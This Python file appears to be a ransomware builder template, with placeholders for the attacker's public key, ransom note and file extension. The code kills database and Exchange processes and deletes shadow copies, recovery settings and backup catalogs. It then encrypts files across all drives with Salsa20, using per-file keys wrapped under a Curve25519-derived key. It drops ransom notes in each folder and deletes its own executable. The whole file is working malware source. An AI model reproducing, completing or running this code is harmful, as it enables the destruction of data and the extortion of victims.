import math
import time
import os,sys
import ctypes
import base64
import winreg
import threading
from Crypto.Cipher import Salsa20,AES
from cryptography.hazmat.primitives.asymmetric import x25519
class Curve25519:
    def genkeypair():
        private = x25519.X25519PrivateKey.generate()
        public = private.public_key()
        return (public,private)
    def exchange(mypub,private):
        return private.exchange(x25519.X25519PublicKey.from_public_bytes(mypub))
{{mypub}}
{{note}}
{{file_flag}}
{{endwith}}
{{note_file}}
def kill():
    os.popen('taskkill /f /im Microsoft.Exchange.*')
    os.popen('taskkill /f /im MSExchange*')
    os.popen('taskkill /f /im sqlserver.exe')
    os.popen('taskkill /f /im sqlwriter.exe')
    os.popen('taskkill /f /im mysqld.exe')
    os.popen('vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet')
extensions_list = [
    '.txt',
    '.php',
    '.pl',
    '.7z',
    '.rar',
    '.m4a',
    '.wma',
    '.avi',
    '.wmv',
    '.csv',
    '.d3dbsp',
    '.sc2save',
    '.sie',
    '.sum',
    '.ibank',
    '.t13',
    '.t12',
    '.qdf',
    '.gdb',
    '.tax',
    '.pkpass',
    '.bc6',
    '.bc7',
    '.bkp',
    '.qic',
    '.bkf',
    '.sidn',
    '.sidd',
    '.mddata',
    '.itl',
    '.itdb',
    '.icxs',
    '.hvpl',
    '.hplg',
    '.hkdb',
    '.mdbackup',
    '.syncdb',
    '.gho',
    '.cas',
    '.svg',
    '.map',
    '.wmo',
    '.itm',
    '.sb',
    '.fos',
    '.mcgame',
    '.vdf',
    '.ztmp',
    '.sis',
    '.sid',
    '.ncf',
    '.menu',
    '.layout',
    '.dmp',
    '.blob',
    '.esm',
    '.001',
    '.vtf',
    '.dazip',
    '.fpk',
    '.mlx',
    '.kf',
    '.iwd',
    '.vpk',
    '.tor',
    '.psk',
    '.rim',
    '.w3x',
    '.fsh',
    '.ntl',
    '.arch00',
    '.lvl',
    '.snx',
    '.cfr',
    '.ff',
    '.vpp_pc',
    '.lrf',
    '.m2',
    '.mcmeta',
    '.vfs0',
    '.mpqge',
    '.kdb',
    '.db0',
    '.mp3',
    '.upx',
    '.rofl',
    '.hkx',
    '.bar',
    '.upk',
    '.das',
    '.iwi',
    '.litemod',
    '.asset',
    '.forge',
    '.ltx',
    '.bsa',
    '.apk',
    '.re4',
    '.sav',
    '.lbf',
    '.slm',
    '.bik',
    '.epk',
    '.rgss3a',
    '.pak',
    '.big',
    '.unity3d',
    '.wotreplay',
    '.xxx',
    '.desc',
    '.py',
    '.m3u',
    '.flv',
    '.js',
    '.css',
    '.rb',
    '.png',
    '.jpeg',
    '.p7c',
    '.p7b',
    '.p12',
    '.pfx',
    '.pem',
    '.crt',
    '.cer',
    '.der',
    '.x3f',
    '.srw',
    '.pef',
    '.ptx',
    '.r3d',
    '.rw2',
    '.rwl',
    '.raw',
    '.raf',
    '.orf',
    '.nrw',
    '.mrwref',
    '.mef',
    '.erf',
    '.kdc',
    '.dcr',
    '.cr2',
    '.crw',
    '.bay',
    '.sr2',
    '.srf',
    '.arw',
    '.3fr',
    '.dng',
    '.jpeg',
    '.jpg',
    '.cdr',
    '.indd',
    '.ai',
    '.eps',
    '.pdf',
    '.pdd',
    '.psd',
    '.dbfv',
    '.mdf',
    '.wb2',
    '.rtf',
    '.wpd',
    '.dxg',
    '.xf',
    '.dwg',
    '.pst',
    '.accdb',
    '.mdb',
    '.pptm',
    '.pptx',
    '.ppt',
    '.xlk',
    '.xlsb',
    '.xlsm',
    '.xlsx',
    '.xls',
    '.wps',
    '.docm',
    '.docx',
    '.doc',
    '.odb',
    '.odc',
    '.odm',
    '.odp',
    '.ods',
    '.odt',
    '.sql',
    '.zip',
    '.tar',
    '.tar.gz',
    '.tgz',
    '.biz',
    '.ocx',
    '.html',
    '.htm',
    '.3gp',
    '.srt',
    '.cpp',
    '.mid',
    '.mkv',
    '.mov',
    '.asf',
    '.mpeg',
    '.vob',
    '.mpg',
    '.fla',
    '.swf',
    '.wav',
    '.qcow2',
    '.vdi',
    '.vmdk',
    '.vmx',
    '.gpg',
    '.aes',
    '.ARC',
    '.PAQ',
    '.tar.bz2',
    '.tbk',
    '.bak',
    '.djv',
    '.djvu',
    '.bmp',
    '.cgm',
    '.tif',
    '.tiff',
    '.NEF',
    '.cmd',
    '.class',
    '.jar',
    '.java',
    '.asp',
    '.brd',
    '.sch',
    '.dch',
    '.dip',
    '.vbs',
    '.asm',
    '.pas',
    '.ldf',
    '.ibd',
    '.MYI',
    '.MYD',
    '.frm',
    '.dbf',
    '.SQLITEDB',
    '.SQLITE3',
    '.asc',
    '.lay6',
    '.lay',
    '.ms11',
    '.sldm',
    '.sldx',
    '.ppsm',
    '.ppsx',
    '.ppam',
    '.docb',
    '.mml',
    '.sxm',
    '.otg',
    '.slk',
    '.xlw',
    '.xlt',
    '.xlm',
    '.xlc',
    '.dif',
    '.stc',
    '.sxc',
    '.ots',
    '.ods',
    '.hwp',
    '.dotm',
    '.dotx',
    '.docm',
    '.DOT',
    '.max',
    '.xml',
    '.uot',
    '.stw',
    '.sxw',
    '.ott',
    '.csr',
    '.key',
    'wallet.dat']
keypair = Curve25519.genkeypair()
publickey = keypair[0].public_bytes_raw()
shared = Curve25519.exchange(mypub,keypair[1])
del keypair
def GetAllDrives():
    buf = ctypes.create_string_buffer(78)
    ctypes.windll.kernel32.GetLogicalDriveStringsW(ctypes.sizeof(buf),buf)
    dblist = buf.raw.replace(b'\x00',b'').split(b'\\')
    dlist = []
    for i in dblist:
        if os.path.isdir(i.decode()+'\\') and i != b'':
            dlist.append(i.decode()+'\\')
    return dlist
def encrypt(file):
    file_size = os.path.getsize(file)
    f = open(file,'rb')
    key = os.urandom(32)
    cipher = Salsa20.new(key=key,nonce=key[10:18])
    context = bytearray(f.read())
    if file_size > 0x1400000:
        chunks = math.ceil(file_size/0xA00000)
        for i in range(0,chunks*0xA00000,0xA00000):
            f.seek(i)
            chunk = f.read(0x100000)
            enchunk = cipher.encrypt(chunk)
            context[i:i+0x100000] = enchunk
        no = b''
    else:
        if file_size > 0x400000:
            no = bytes(context[0x400000:])
            context = context[:0x400000]
        else:
            no = b''
            context = context
        context = cipher.encrypt(bytes(context))
    f.close()
    cipher = AES.new(key=shared,mode=AES.MODE_ECB)
    enkey = cipher.encrypt(key)
    with open(file,'wb') as f:
        f.write(enkey+bytes(context)+no+file_flag)
    return True
def write_readme(path,ID):
    note_path = os.path.join(path,note_file)
    with open(note_path,'w') as f:
        f.write(note.replace('{{ID}}',ID))
def endir(path,ID):
    for parent, dirnames, filenames in os.walk(path):
        if ':\\Windows' in parent or ':\\$RECYCLE.BIN' in parent:
            continue
        for filename in filenames:
            try:
                write_readme(parent,ID)
            except:
                pass
            file_path = os.path.join(parent, filename)
            extensions = os.path.splitext(file_path)[1]
            if extensions in extensions_list and filename != note_file:
                try:
                    os.rename(file_path,file_path+endwith)
                    encrypt(file_path+endwith)
                except:
                    pass
    return True
if __name__ == '__main__':
    add = 0
    for i in publickey:
        add += i
    IDb = publickey+int.to_bytes(add%256,1,'little')
    ID = base64.b64encode(IDb).decode()
    drives = GetAllDrives()
    threads = []
    for drive in drives:
        threads.append(threading.Thread(target=endir,args=(drive,ID)))
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    del shared
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders')
    desktop = winreg.QueryValueEx(key, "Desktop")[0]
    write_readme(desktop,ID)
    os.popen(os.path.join(desktop,note_file))
    try:
        os.remove(sys.executable)
    except:
        pass
    sys.exit()
